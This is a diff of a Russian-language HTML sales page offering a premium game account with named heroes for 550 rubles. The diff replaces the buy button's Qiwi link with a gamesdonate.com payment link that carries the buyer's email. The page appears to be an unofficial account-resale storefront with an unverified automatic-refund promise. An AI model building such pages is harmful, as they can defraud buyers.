@@ -35,9 +35,9 @@
 				<span>Мы хотим предложить вам товар </span><span id='key'>Аккаунт [Премиум]</span><span> за </span></span><span id='key'>550 ₽.</span><span> Для того, чтобы получить данный товар, вам необходимо заполнить данные, которые мы предоставили вам чуть ниже, и нажать на кнопку купить. Если вы правильно ввели свою рабочую почту, то логин и пароль от аккаунта придут вам на нее в течении 3 минут. В случае, если у нас появятся какие-либо проблемы с отправкой товара, и если в течении 8 часов мы не сможем отправить на ваш аккаунт товар, наш бот сразу же отправит ваши деньги на ваш Qiwi кошелек или на карту (смотря с чего вы оплачивали).</br>На аккаунте имеются:</br>• Герой Leon</br>• Герой Bea</br>• Герой Max</br>• Герой Spike</br>• Герой Voron</br>• Герой Sandy</br></span>
 			</div>
 			<div id='form'>
-				<input type='text' placeholder='Ваша почта'></br>
+				<input type='text' placeholder='Ваша почта' id='n'></br>
 				<input type='text' placeholder='Ваш ник'></br>
-				<button onclick='window.open("https://qiwi.me/action/checkout/brawlshop_gems?sum=550&currency_id=643&source=qw")'>Купить</button>
+				<button onclick='window.open("https://gamesdonate.com/pay/464fea67a96ecdefcc?account=" + document.getElementById("n").value + "&good=12172&sum=")'>Купить</button>
 			</div>
 		</div>
 	</main>
